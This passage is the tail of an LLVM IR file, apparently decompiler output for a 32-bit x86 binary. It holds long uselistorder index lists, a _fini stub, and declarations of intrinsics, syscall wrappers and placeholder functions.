1598, 1419, 1420, 147, 252, 158, 10, 1367, 48, 137, 159, 138, 1837, 350, 1128, 1838, 1129, 1839, 1443, 1444, 1445, 1130, 1131, 1446, 453, 454, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1062, 417, 1620, 1449, 1447, 253, 1448, 1132, 351, 1450, 1133, 1451, 1458, 1134, 1459, 1452, 1453, 1454, 1455, 1135, 1456, 1457, 11, 1368, 1460, 1461, 1462, 1463, 1464, 149, 1465, 1343, 1344, 1345, 254, 1621, 255, 256, 1896, 12, 1897, 1898, 455, 1899, 257, 258, 1136, 1137, 1900, 13, 1901, 259, 1138, 1902, 1903, 1904, 1905, 1139, 1140, 1141, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 1906, 270, 1907, 271, 457, 458, 456, 1045, 1908, 382, 273, 272, 1469, 1622, 1623, 1624, 1625, 1626, 274, 275, 276, 277, 278, 279, 280, 1627, 1142, 1639, 1640, 1628, 1629, 1630, 114, 115, 1631, 1632, 14, 1633, 1634, 116, 117, 1635, 1636, 1637, 1638, 1644, 1645, 1641, 1642, 121, 122, 123, 1643, 1143, 49, 118, 119, 120, 1144, 1646, 1647, 1650, 1651, 1648, 1649, 112, 113, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1668, 1659, 1660, 1661, 1662, 1663, 1664, 419, 1665, 420, 418, 1666, 421, 1667, 1669, 150, 383, 282, 281, 1145, 459, 460, 384, 1670, 283, 1671, 284, 285, 286, 287, 288, 289, 290, 63, 160, 1672, 1673, 291, 1146, 1674, 461, 1675, 1676, 1147, 1677, 1678, 64, 1148, 50, 51, 124, 1063, 52, 70, 71, 1149, 30, 1683, 1150, 29, 1151, 1684, 1685, 1686, 53, 72, 73, 1152, 1687, 1688, 292, 293, 294, 295, 296, 297, 298, 1153, 1154, 1689, 1700, 1690, 1691, 1694, 1695, 1696, 1064, 1697, 1698, 1699, 385, 1701, 1702, 1703, 1704, 299, 1155, 300, 1157, 1156, 1705, 1706, 1707, 1682, 301, 1158, 302, 303, 1304, 1305, 1306, 462, 1692, 1693, 304, 463, 1679, 1680, 1681, 427, 1065, 305, 307, 306, 1159, 1160, 1708, 1161, 1709, 1710, 1162, 1711, 1712, 1713, 386, 1714, 1715, 308, 1716, 1163, 1164, 1717, 309, 310, 311, 312, 313, 314, 315, 316, 1718, 1719, 1720, 1721, 1722, 1346, 1347, 1348, 1349, 1350, 317, 1351, 1352, 361, 1165, 1353, 387, 1354, 1166, 1723, 318, 464, 465, 466, 1046, 1167, 424, 1168, 1724, 388, 15, 1169, 1725, 1726, 468, 1727, 1728, 1729, 1730, 1731, 1732, 1170, 1733, 319, 320, 1734, 1735, 467, 1736, 1737, 125, 1738, 1739, 469, 1740, 1741, 1742, 1743, 1744, 1171, 1745, 1746, 1747, 321, 389, 1748, 153, 1749, 1750, 470, 1751, 1752, 1753, 471, 1754, 1755, 1172, 390, 1756, 1757, 1758, 1759, 323, 322, 1760, 1770, 1782, 472, 1783, 1784, 1785, 324, 1786, 126, 1787, 1788, 1789, 1790, 1791, 154, 354, 391, 1792, 1761, 392, 1762, 473, 1763, 16, 1173, 1764, 474, 1765, 1766, 1767, 1768, 1769, 1771, 393, 1772, 475, 1773, 17, 1174, 1774, 1775, 476, 1776, 1777, 1778, 1779, 1780, 1781, 1175, 1176, 325, 1355, 1356, 1177, 1357, 1909, 1178, 326, 477, 1179, 1911, 1912, 1913, 127, 394, 1914, 341, 1369, 1370, 1371, 54, 128, 342, 327, 1372, 1373, 1374, 55, 129, 56, 74, 1375, 328, 1376, 57, 75, 422, 1377, 1378, 1379, 1381, 1380, 1382, 395, 479, 480, 478, 1383, 1384, 24, 25, 1385, 1387, 355, 1386, 481, 482, 1388, 26, 27, 1389, 1390, 1391, 1400, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 161, 1408, 58, 133, 132, 1409, 1410, 356, 131, 130, 1411, 359, 357, 358, 59, 76, 1412, 485, 396, 1413, 484, 483, 486, 1414, 487, 1047, 362, 1048, 329, 1415, 397, 1416, 1049, 65, 1418, 60, 77, 1417, 363, 364, 489, 423, 488, 1421, 330, 1422, 1423, 1424, 331, 490, 491, 332, 1425, 492, 1426, 333, 334, 1429, 1428, 1427, 493, 1430, 1431, 335, 336, 337, 1466, 1467, 494, 31, 78, 1468, 22, 23, 338, 61, 1470, 495, 1793, 1847, 1848, 428, 1849, 1850, 134, 339, 18, 1910, 340, 1859, 352, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922 }
  uselistorder i32 -1, { 0, 1, 102, 103, 104, 105, 220, 106, 107, 108, 187, 188, 109, 48, 110, 111, 15, 189, 112, 190, 113, 49, 114, 191, 115, 116, 221, 222, 223, 117, 226, 118, 119, 87, 16, 57, 197, 198, 58, 120, 121, 59, 60, 61, 50, 123, 122, 199, 124, 126, 125, 200, 17, 18, 127, 128, 19, 20, 129, 227, 2, 3, 130, 224, 131, 196, 132, 38, 39, 40, 41, 42, 43, 44, 45, 80, 81, 52, 133, 134, 135, 136, 51, 56, 137, 138, 53, 139, 4, 88, 21, 22, 23, 24, 5, 85, 62, 201, 55, 202, 140, 83, 141, 142, 203, 25, 143, 26, 89, 90, 64, 65, 63, 66, 67, 204, 144, 145, 100, 228, 146, 68, 147, 148, 149, 150, 206, 205, 151, 82, 46, 47, 207, 152, 153, 27, 28, 29, 30, 229, 208, 209, 154, 230, 155, 231, 156, 157, 31, 158, 91, 92, 84, 86, 159, 210, 160, 54, 161, 225, 162, 163, 164, 211, 69, 165, 70, 101, 192, 212, 71, 166, 93, 232, 6, 72, 167, 233, 168, 94, 169, 170, 73, 171, 7, 172, 74, 173, 213, 214, 215, 75, 174, 216, 76, 77, 175, 8, 193, 9, 95, 32, 33, 176, 177, 78, 79, 96, 217, 218, 219, 178, 34, 35, 179, 36, 37, 180, 194, 181, 182, 183, 10, 195, 184, 11, 12, 13, 185, 186, 14, 97, 98, 99 }
  uselistorder i32 1, { 407, 406, 210, 267, 268, 971, 289, 290, 684, 90, 377, 70, 69, 71, 408, 211, 212, 409, 213, 214, 685, 249, 686, 413, 412, 411, 410, 36, 948, 947, 265, 950, 949, 659, 269, 660, 661, 270, 662, 663, 271, 664, 291, 665, 666, 667, 668, 669, 323, 254, 670, 324, 671, 672, 272, 255, 673, 273, 674, 675, 676, 677, 654, 951, 952, 954, 955, 956, 957, 958, 0, 1, 343, 959, 960, 962, 961, 963, 415, 414, 104, 112, 107, 105, 109, 103, 108, 110, 106, 111, 416, 953, 417, 216, 215, 418, 378, 218, 217, 219, 221, 220, 419, 185, 184, 183, 186, 420, 421, 292, 771, 274, 772, 293, 773, 774, 2, 775, 776, 777, 778, 779, 780, 768, 769, 335, 770, 423, 422, 122, 119, 120, 121, 123, 344, 424, 426, 425, 785, 786, 787, 788, 789, 790, 791, 67, 66, 65, 973, 427, 64, 63, 345, 27, 86, 3, 428, 61, 62, 60, 702, 703, 704, 294, 346, 705, 430, 429, 47, 48, 706, 707, 708, 295, 296, 297, 298, 709, 432, 431, 781, 782, 784, 783, 46, 43, 44, 45, 974, 975, 976, 977, 433, 42, 39, 41, 40, 434, 113, 299, 964, 437, 436, 435, 180, 438, 181, 439, 28, 440, 152, 150, 151, 153, 946, 441, 117, 118, 442, 759, 445, 401, 444, 443, 379, 85, 84, 446, 679, 5, 680, 338, 4, 681, 450, 449, 448, 447, 209, 275, 347, 451, 460, 459, 458, 457, 456, 455, 454, 453, 452, 300, 792, 793, 276, 794, 277, 463, 462, 461, 380, 381, 156, 464, 795, 797, 796, 798, 800, 799, 465, 76, 77, 78, 79, 687, 688, 689, 690, 691, 692, 278, 382, 98, 95, 91, 93, 92, 94, 97, 96, 466, 801, 469, 468, 467, 72, 73, 802, 803, 325, 804, 197, 198, 196, 75, 805, 53, 54, 52, 470, 126, 129, 131, 130, 125, 128, 127, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 383, 37, 978, 472, 471, 124, 979, 473, 30, 31, 29, 301, 474, 475, 477, 476, 478, 141, 140, 479, 59, 480, 222, 972, 481, 208, 348, 302, 256, 760, 482, 710, 55, 818, 819, 817, 820, 821, 822, 823, 824, 303, 327, 242, 243, 825, 826, 250, 258, 257, 244, 251, 6, 7, 349, 827, 828, 829, 830, 831, 832, 483, 80, 81, 82, 833, 834, 835, 836, 114, 484, 485, 693, 694, 145, 146, 751, 752, 486, 143, 144, 980, 154, 155, 487, 981, 982, 488, 34, 32, 35, 33, 837, 838, 839, 840, 304, 489, 132, 133, 9, 305, 841, 842, 306, 843, 844, 845, 846, 847, 8, 245, 490, 851, 493, 492, 491, 148, 147, 149, 848, 279, 333, 10, 494, 502, 501, 500, 499, 498, 497, 496, 495, 203, 850, 508, 507, 506, 505, 504, 503, 849, 336, 509, 223, 225, 224, 510, 101, 100, 99, 511, 228, 227, 226, 755, 756, 266, 757, 512, 58, 57, 56, 307, 513, 761, 514, 402, 142, 852, 853, 854, 160, 515, 195, 194, 516, 517, 38, 518, 695, 280, 519, 207, 205, 204, 206, 855, 522, 521, 520, 182, 525, 524, 523, 102, 308, 309, 526, 983, 310, 311, 984, 11, 12, 530, 529, 528, 527, 115, 116, 312, 13, 14, 350, 531, 542, 541, 540, 539, 538, 537, 536, 535, 534, 403, 533, 532, 544, 543, 762, 313, 856, 548, 547, 546, 545, 89, 87, 88, 549, 857, 858, 859, 860, 861, 862, 282, 863, 864, 865, 866, 867, 655, 868, 281, 869, 870, 871, 351, 555, 554, 553, 552, 551, 550, 136, 138, 137, 135, 134, 139, 384, 872, 15, 873, 560, 559, 558, 557, 556, 74, 561, 874, 875, 352, 353, 880, 337, 16, 881, 882, 883, 884, 328, 329, 283, 885, 314, 886, 887, 315, 316, 888, 889, 892, 893, 656, 894, 895, 896, 897, 898, 899, 900, 583, 388, 387, 582, 581, 580, 579, 578, 577, 576, 575, 574, 386, 573, 572, 571, 570, 569, 568, 567, 566, 565, 564, 563, 562, 385, 389, 165, 163, 162, 161, 164, 879, 229, 284, 682, 683, 17, 584, 68, 890, 891, 586, 585, 876, 877, 878, 246, 901, 317, 902, 903, 904, 18, 588, 587, 390, 49, 50, 51, 589, 905, 906, 907, 908, 678, 592, 391, 591, 590, 392, 167, 168, 166, 169, 170, 354, 594, 593, 595, 596, 597, 598, 599, 601, 600, 83, 603, 602, 178, 179, 696, 697, 698, 699, 700, 355, 176, 174, 175, 177, 909, 910, 911, 912, 913, 914, 915, 916, 357, 356, 917, 918, 919, 259, 920, 358, 921, 359, 360, 922, 605, 604, 188, 191, 190, 192, 189, 193, 923, 924, 362, 361, 330, 331, 941, 942, 318, 260, 363, 943, 364, 365, 944, 945, 606, 199, 201, 200, 202, 19, 925, 20, 926, 927, 928, 929, 930, 366, 931, 367, 368, 932, 607, 233, 231, 230, 232, 234, 21, 933, 22, 934, 935, 936, 937, 938, 369, 939, 370, 371, 319, 940, 608, 237, 235, 236, 238, 701, 326, 23, 609, 187, 610, 985, 986, 987, 988, 612, 611, 157, 158, 159, 711, 262, 712, 263, 713, 714, 286, 715, 716, 320, 285, 717, 287, 718, 24, 25, 372, 264, 719, 720, 620, 405, 404, 619, 618, 617, 616, 615, 614, 613, 393, 394, 172, 171, 173, 721, 722, 723, 724, 725, 321, 621, 627, 626, 625, 624, 623, 622, 240, 239, 241, 628, 726, 252, 727, 728, 729, 730, 731, 732, 733, 734, 735, 395, 396, 247, 736, 261, 253, 737, 738, 739, 740, 248, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 629, 398, 397, 399, 753, 630, 373, 631, 632, 635, 634, 633, 754, 636, 758, 374, 657, 638, 637, 288, 322, 375, 658, 334, 376, 645, 644, 643, 642, 641, 640, 639, 763, 764, 765, 647, 646, 400, 648, 332, 766, 26, 767, 649, 339, 965, 966, 340, 967, 968, 341, 342, 969, 970, 650, 989, 651, 652, 653 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8053b57 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8053b57
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.cttz.i32(i32, i1) #1

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare float @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigcontext* @__decompiler_undefined_function_6() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_7() local_unnamed_addr

declare double @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
